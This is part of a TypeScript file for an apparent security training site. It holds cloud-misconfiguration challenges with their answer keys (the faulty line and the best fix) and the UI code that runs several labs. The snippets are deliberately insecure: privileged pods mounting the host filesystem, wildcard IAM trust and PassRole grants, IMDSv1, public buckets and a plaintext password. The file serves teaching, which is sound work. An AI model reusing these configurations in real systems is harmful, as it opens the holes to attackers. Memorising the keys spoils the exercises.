    fixes: ['Turn on MFA for mlopez', 'Rename the ci-deploy user', 'Replace ci-deploy\'s 431-day-old key with a short-lived role (or rotate it) and remove unused keys'],
    why: 'Long-lived access keys leak through repos, laptops and logs. Old, unrotated keys on a user with no MFA are a common way into cloud accounts.' },
  { id: 'root', title: 'Who signed in?', lang: 'CloudTrail event (JSON)', cwe: 'Root account use without MFA', bad: 4, fix: 1,
    code: ['{', '  "eventName": "ConsoleLogin",', '  "sourceIPAddress": "203.0.113.66",', '  "userIdentity": { "type": "Root" }, "MFAUsed": "No"', '}'],
    fixes: ['Block the IP address only', 'Investigate now: enable MFA on root, lock root credentials away and use named admin roles day to day', 'Ignore it: root logins are normal'],
    why: 'The root user can do anything, including closing the account. It should almost never sign in, and never without MFA.' },
  { id: 'k8s', title: 'Container settings', lang: 'Kubernetes pod (YAML)', cwe: 'Privileged container', bad: 7, fix: 0,
    code: ['apiVersion: v1', 'kind: Pod', 'metadata: { name: report-worker }', 'spec:', '  containers:', '  - image: isu/report-worker:1.4', '    securityContext: { privileged: true }'],
    fixes: ['Remove privileged: true; run as non-root with a read-only filesystem and dropped capabilities', 'Pin the image to :latest', 'Add more CPU to the pod'],
    why: 'A privileged container is effectively root on the node. One bug in the app becomes a takeover of the host and its other pods.' },
  { id: 'azure-blob', title: 'Shared files', lang: 'Azure storage container (JSON)', cwe: 'Anonymous blob access', bad: 3, fix: 1,
    code: ['{', '  "name": "advising-notes",', '  "publicAccess": "Container",', '  "storageAccount": "isufiles"', '}'],
    fixes: ['Move the files to a container with a longer name', 'Set publicAccess to None and share with signed-in users or short-lived SAS links', 'Turn on soft delete'],
    why: '"Container" access lets anyone list and download every blob. The same mistake exists in every cloud under different names.' },
  { id: 'gcp-iam', title: 'Bucket sharing', lang: 'Google Cloud IAM binding (YAML)', cwe: 'Public principal', bad: 3, fix: 2,
    code: ['bindings:', '- role: roles/storage.objectViewer', '  members: [allUsers]', 'bucket: isu-lab-images'],
    fixes: ['Change the role to storage.objectAdmin', 'Add allAuthenticatedUsers too', 'Replace allUsers with the specific group or service account that needs access'],
    why: 'allUsers is the whole internet. allAuthenticatedUsers is anyone with any Google account, which is nearly as bad.' },
  { id: 'tf-encrypt', title: 'Infrastructure as code', lang: 'Terraform (HCL)', cwe: 'Encryption at rest disabled', bad: 4, fix: 0,
    code: ['resource "aws_db_instance" "advising" {', '  engine            = "mysql"', '  instance_class    = "db.t3.micro"', '  storage_encrypted = false', '}'],
    fixes: ['Set storage_encrypted = true (with a managed key) and add a policy check in CI', 'Use a bigger instance class', 'Add a tag that says confidential'],
    why: 'Encryption at rest protects snapshots, backups and disks. Catching it in Terraform review, or with a policy scanner like Checkov, is far cheaper than fixing it later.' },
  { id: 'lambda-env', title: 'Serverless function', lang: 'AWS Lambda configuration (JSON)', cwe: 'Secret in plain environment variable', bad: 4, fix: 1,
    code: ['{', '  "FunctionName": "send-reminders",', '  "Runtime": "python3.12",', '  "Environment": { "SMTP_PASSWORD": "Spring2026!" }', '}'],
    fixes: ['Base64-encode the password', 'Store it in Secrets Manager (or Parameter Store) and give the function permission to read only that secret', 'Move it to a comment in the code'],
    why: 'Anyone who can read the function configuration sees the password, and it ends up in templates and logs. Secret stores add access control, auditing and rotation.' },
  // ---- Advanced
  { id: 'adv-passrole', title: 'Developer policy', lang: 'AWS IAM policy (JSON)', cwe: 'Privilege escalation through iam:PassRole', bad: 5, fix: 1,
    code: ['{', '  "Statement": [', '    { "Effect": "Allow", "Action": ["ec2:RunInstances", "ec2:Describe*"], "Resource": "*" },', '    { "Effect": "Allow", "Action": "s3:*", "Resource": "arn:aws:s3:::dev-scratch/*" },', '    { "Effect": "Allow", "Action": "iam:PassRole", "Resource": "*" }', '  ]', '}'],
    fixes: ['Remove ec2:Describe*', 'Allow iam:PassRole only for the one role the app needs, with an iam:PassedToService condition', 'Move s3:* to a separate policy'],
    why: 'PassRole on * lets a developer launch an instance with the admin role attached, then use its credentials. The policy never says "admin", but it grants it.' },
  { id: 'adv-trust', title: 'Cross-account role', lang: 'AWS role trust policy (JSON)', cwe: 'Anyone can assume the role', bad: 4, fix: 2,
    code: ['{', '  "Statement": [{', '    "Effect": "Allow",', '    "Principal": { "AWS": "*" },', '    "Action": "sts:AssumeRole"', '  }]', '}'],
    fixes: ['Add a Deny for sts:TagSession', 'Shorten the session to one hour', 'Name the partner\'s account ID as the Principal and require an sts:ExternalId condition'],
    why: 'Principal * in a trust policy means any AWS account in the world can assume this role. Trust exactly one account, and use an external ID for vendors.' },
  { id: 'adv-imds', title: 'Web server instance', lang: 'Terraform (HCL)', cwe: 'Credentials reachable through SSRF', bad: 5, fix: 0,
    code: ['resource "aws_instance" "web" {', '  ami           = var.ami', '  instance_type = "t3.small"', '  metadata_options {', '    http_tokens = "optional"', '  }', '  iam_instance_profile = aws_iam_instance_profile.web.name', '}'],
    fixes: ['Require IMDSv2: http_tokens = "required" (and a hop limit of 1)', 'Use a bigger instance type', 'Remove the AMI variable'],
    why: 'With IMDSv1 allowed, one SSRF bug (see Secure Code Review) can read 169.254.169.254 and steal the instance role\'s keys, which is how the 2019 Capital One breach worked. IMDSv2 needs a session token an SSRF usually cannot get.' },
  { id: 'adv-privileged-pod', title: 'Log collector pod', lang: 'Kubernetes (YAML)', cwe: 'Container escape to the node', bad: 7, fix: 1,
    code: ['apiVersion: v1', 'kind: Pod', 'metadata: { name: log-agent }', 'spec:', '  containers:', '  - name: agent', '    securityContext: { privileged: true }', '    volumeMounts: [{ name: host, mountPath: /host }]', '  volumes: [{ name: host, hostPath: { path: / } }]'],
    fixes: ['Pin the image tag', 'Drop privileged, mount only /var/log read-only, and run as non-root', 'Put the pod in its own namespace'],
    why: 'privileged: true plus the whole host filesystem means anyone who breaks into this container owns the node, and often the cluster. Mount only what the agent reads.' },
  { id: 'adv-allauth', title: 'Research bucket', lang: 'Google Cloud IAM binding (YAML)', cwe: 'Exposed to every Google account', bad: 3, fix: 2,
    code: ['bindings:', '- role: roles/storage.objectViewer', '  members: [allAuthenticatedUsers]', 'etag: BwYk2EXAMPLE'],
    fixes: ['Change the role to objectAdmin', 'Add an etag check', 'Grant the role to the research group only, e.g. group:research@isu.example'],
    why: '"Authenticated" sounds safe, but allAuthenticatedUsers means anyone with any Google account, which is nearly everyone. Grant named groups.' },
];

/* ============================================================ UI */
const root = typeof document === 'undefined' ? null : document.querySelector<HTMLElement>('#chal');
if (root) {
  const lab = root.dataset.lab || ''; const KEY = 'cyberhub:' + lab;
  const el = <K extends keyof HTMLElementTagNameMap>(tag: K, text = '', cls = '') => { const e = document.createElement(tag); if (text) e.textContent = text; if (cls) e.className = cls; return e; };
  const $ = <T extends HTMLElement = HTMLElement>(s: string) => root.querySelector<T>(s)!;
  let solved: string[] = []; try { const v = JSON.parse(localStorage.getItem(KEY) || '[]'); if (Array.isArray(v)) solved = v.filter(x => typeof x === 'string'); } catch { /* ignore */ }
  const save = () => { try { localStorage.setItem(KEY, JSON.stringify(solved)); } catch { /* ignore */ } };
  const SNIPS = lab === 'cloud' ? CLOUD : REVIEW;
  const levels: Level[] = lab === 'pcap' ? PCAP_LEVELS : lab === 'hunt' ? HUNT_LEVELS : lab === 'ad' ? AD_LEVELS : lab === 'crypto' ? cryptoLevels() : SNIPS.map(r => ({ id: r.id, title: r.title, q: '', a: '', hints: [], lesson: r.why }));
  let cur = 0, hintN = 0;
  const nav = $('#ch-lvls');
  const adv = (l: Level) => l.id.startsWith('adv-');
  levels.forEach((l, i) => { if (adv(l) && (i === 0 || !adv(levels[i - 1]))) nav.append(el('span', 'Advanced', 'label ch-adv-sep'));
    const b = el('button', String(i + 1)); b.type = 'button'; b.dataset.i = String(i); b.title = l.title + (adv(l) ? ' (Advanced)' : ''); if (adv(l)) b.classList.add('adv'); b.setAttribute('aria-label', `Level ${i + 1}${adv(l) ? ', advanced' : ''}: ${l.title}`); b.addEventListener('click', () => open(i)); nav.append(b); });
  const mark = () => nav.querySelectorAll<HTMLButtonElement>('button').forEach(b => { const i = Number(b.dataset.i); b.classList.toggle('done', solved.includes(levels[i].id)); b.setAttribute('aria-current', String(i === cur)); });
  const status = () => { $('#ch-count').textContent = `${solved.filter(id => levels.some(l => l.id === id)).length} of ${levels.length} solved`; };
  const win = () => { const L = levels[cur]; if (!solved.includes(L.id)) { solved.push(L.id); save(); } const r = $('#ch-lesson'); r.hidden = false; r.querySelector('p')!.textContent = L.lesson; ($('#ch-next') as HTMLButtonElement).hidden = cur >= levels.length - 1; mark(); status(); };
  const fb = $('#ch-msg');

  /* ---- workspace per lab */
  let onOpen: (L: Level) => void = () => {};
  if (lab === 'pcap') {
    const pk = capture(); const tb = $('#pc-body'); const input = $<HTMLInputElement>('#pc-filter'); const err = $('#pc-err'); const cnt = $('#pc-count'); const det = $('#pc-detail');
    const render = (f: (p: Pkt) => boolean) => { const rows = pk.filter(f); tb.replaceChildren(...rows.map(p => { const tr = el('tr'); tr.tabIndex = 0; for (const v of [p.no, p.t.toFixed(3), p.src, p.dst, p.proto, p.info]) tr.append(el('td', String(v))); tr.addEventListener('click', () => detail(p)); tr.addEventListener('keydown', e => { if (e.key === 'Enter') detail(p); }); return tr; })); cnt.textContent = `Showing ${rows.length} of ${pk.length} packets`; };
    const detail = (p: Pkt) => { det.replaceChildren(el('b', `Packet ${p.no}`)); const add = (k: string, v: unknown) => { if (v !== undefined && v !== '') { const d = el('div'); d.append(el('span', k + ': ', 'label'), el('code', String(v))); det.append(d); } };
      add('Protocol', p.proto); add('Source', p.src + (p.sport ? ':' + p.sport : '')); add('Destination', p.dst + (p.dport ? ':' + p.dport : '')); add('TCP flags', p.flags); add('Length', p.len); add('DNS name', p.dns); add('HTTP host', p.host); add('HTTP URI', p.uri); add('User-Agent', p.ua); add('Info', p.info); det.hidden = false; };
    const apply = () => { try { render(compileFilter(input.value)); err.textContent = ''; input.removeAttribute('aria-invalid'); } catch (e) { err.textContent = (e as Error).message; input.setAttribute('aria-invalid', 'true'); } };
    $('#pc-form').addEventListener('submit', e => { e.preventDefault(); apply(); });
    $('#pc-clear').addEventListener('click', () => { input.value = ''; apply(); });
    root.querySelectorAll<HTMLButtonElement>('[data-f]').forEach(b => b.addEventListener('click', () => { input.value = b.dataset.f!; apply(); }));
    onOpen = L => { input.value = L.start || ''; det.hidden = true; apply(); };
  } else if (lab === 'hunt' || lab === 'ad') {
    const ev: Rec[] = lab === 'ad' ? adEvents() : events() as unknown as Rec[]; const FIELDS = lab === 'ad' ? AD_FIELDS : EV_FIELDS; const input = $<HTMLInputElement>('#lh-q'); const err = $('#lh-err'); const out = $('#lh-out'); const cnt = $('#lh-count');
    const apply = () => { try { const r = runQuery(ev, input.value, FIELDS); err.textContent = ''; input.removeAttribute('aria-invalid');
      if (r.table) { const t = el('table', '', 'lh-table'); const hr = el('tr'); r.table.cols.forEach(c => hr.append(el('th', c))); const th = el('thead'); th.append(hr); const tb = el('tbody'); r.table.rows.forEach(row => { const tr = el('tr'); row.forEach(v => tr.append(el('td', String(v)))); tb.append(tr); }); t.append(th, tb); out.replaceChildren(t); cnt.textContent = `${r.count} events matched · ${r.table.rows.length} result rows`; }
      else { const ol = el('ol', '', 'lh-lines'); r.rows.slice(0, 200).forEach(e => ol.append(el('li', String(e.raw)))); out.replaceChildren(ol); cnt.textContent = `${r.count} events matched${r.count > 200 ? ' (showing 200)' : ''}`; } }
      catch (e) { err.textContent = (e as Error).message; input.setAttribute('aria-invalid', 'true'); } };
    $('#lh-form').addEventListener('submit', e => { e.preventDefault(); apply(); });
    root.querySelectorAll<HTMLButtonElement>('[data-q]').forEach(b => b.addEventListener('click', () => { input.value = b.dataset.q!; apply(); }));
    onOpen = L => { input.value = L.start || ''; apply(); };
  } else if (lab === 'crypto') {
    const inp = $<HTMLTextAreaElement>('#cr-in'); const outp = $('#cr-out'); const list = $('#cr-recipe'); const err = $('#cr-err'); let recipe: { id: string; p: number }[] = [];
    const run = () => { list.replaceChildren(...recipe.map((r, i) => { const li = el('li'); const op = OPS.find(o => o.id === r.id)!; li.append(el('span', op.name));
      if (op.param) { const n = el('input') as HTMLInputElement; n.type = 'number'; n.value = String(r.p); n.setAttribute('aria-label', op.param); n.addEventListener('input', () => { r.p = Number(n.value) || 0; compute(); }); li.append(n); }
      const x = el('button', '✕'); x.type = 'button'; x.setAttribute('aria-label', 'Remove ' + op.name); x.addEventListener('click', () => { recipe.splice(i, 1); run(); }); li.append(x); return li; })); compute(); };
    const compute = () => { try { outp.textContent = applyRecipe(inp.value, recipe); err.textContent = ''; } catch (e) { outp.textContent = ''; err.textContent = 'Recipe stopped: ' + (e as Error).message + '.'; } };
    const ops = $('#cr-ops'); OPS.forEach(o => { const b = el('button', o.name); b.type = 'button'; b.addEventListener('click', () => { recipe.push({ id: o.id, p: 0 }); run(); }); ops.append(b); });
    inp.addEventListener('input', compute); $('#cr-reset').addEventListener('click', () => { recipe = []; run(); });
    $('#cr-hash').addEventListener('click', async () => { outp.textContent = 'SHA-256: ' + await sha256(applyRecipe(inp.value, recipe)); });
    onOpen = L => { const c = CRYPTO.find(x => x.id === L.id)!; inp.value = c.input; recipe = []; run(); };
  }

  /* ---- review lab has its own flow */
  if (lab === 'review' || lab === 'cloud') {
    const code = $('#rv-code'); const fixes = $('#rv-fixes'); let lineOk = false, misses = 0;
    onOpen = () => { const s = SNIPS[cur]; lineOk = false; misses = 0; $('#ch-q').textContent = `${s.lang} · Click the line that ${lab === 'cloud' ? 'shows the misconfiguration' : 'introduces the vulnerability'}.`; fixes.hidden = true; fixes.replaceChildren();
      code.replaceChildren(...s.code.map((ln, i) => { const b = el('button', '', 'rv-line'); b.type = 'button'; b.append(el('span', String(i + 1), 'rv-n'), el('code', ln || ' ')); b.addEventListener('click', () => pickLine(i + 1, b)); return b; })); };
    const pickLine = (n: number, b: HTMLElement) => { const s = SNIPS[cur]; if (lineOk) return; if (n !== s.bad) { misses++; b.classList.add('miss'); fb.textContent = misses >= 2 ? (lab === 'cloud' ? 'Not that one. Look for anything open to everyone (*, 0.0.0.0/0, allUsers, public), switched off, or far too old.' : 'Not that one. Look for where outside input meets something powerful: a query, the shell, the file system, the browser, or a permission.') : 'Not that line. Try again.'; return; }
      lineOk = true; b.classList.add('hit'); fb.textContent = `Found it: ${s.cwe}. Now pick the best fix.`; fixes.hidden = false; fixes.replaceChildren(el('p', 'Best fix?', 'label'), ...s.fixes.map((f, i) => { const fbn = el('button', f, 'opt'); fbn.type = 'button'; fbn.addEventListener('click', () => { if (i === s.fix) { fbn.classList.add('right'); fb.textContent = 'Correct.'; win(); } else { fbn.classList.add('wrong'); fbn.disabled = true; fb.textContent = 'That would not fix the root cause. Try another.'; } }); return fbn; })); };
  }

  function open(i: number) {
    cur = i; hintN = 0; const L = levels[i]; $('#ch-lvl').textContent = `Level ${i + 1} of ${levels.length}${adv(L) ? ' · Advanced' : ''}: ${L.title}`; if (lab !== 'review' && lab !== 'cloud') $('#ch-q').textContent = L.q;
    $('#ch-lesson').hidden = true; fb.textContent = ''; const hb = root!.querySelector<HTMLButtonElement>('#ch-hint'); if (hb) { hb.hidden = !L.hints.length; hb.textContent = 'Stuck? Get a hint'; }
    root!.querySelector<HTMLElement>('#ch-hints')?.replaceChildren(); const a = root!.querySelector<HTMLInputElement>('#ch-a'); if (a) a.value = '';
    onOpen(L); mark();
  }
  root.querySelector('#ch-hint')?.addEventListener('click', () => { const H = levels[cur].hints; if (!H.length) return; const box = $('#ch-hints'); if (hintN < H.length) { box.append(el('li', H[hintN])); hintN++; } $('#ch-hint').textContent = hintN >= H.length ? 'No more hints' : 'Another hint'; });
  root.querySelector('#ch-form')?.addEventListener('submit', async e => { e.preventDefault(); const L = levels[cur]; const v = norm($<HTMLInputElement>('#ch-a').value); if (!v) return;
    let ok: boolean; if (lab === 'crypto' && L.id === 'hash') ok = v.length >= 8 && (await sha256('CyberHub')).startsWith(v); else ok = (Array.isArray(L.a) ? L.a : [L.a]).some(x => norm(x) === v || norm(x).replace(/^\//, '') === v.replace(/^\//, ''));
    fb.textContent = ok ? '✔ Correct. Level complete.' : '✘ Not quite. Check the evidence again, or take a hint.'; if (ok) win(); });
  $('#ch-next').addEventListener('click', () => open(Math.min(cur + 1, levels.length - 1)));
  const first = levels.findIndex(l => !solved.includes(l.id)); open(first < 0 ? 0 : first); status();
}
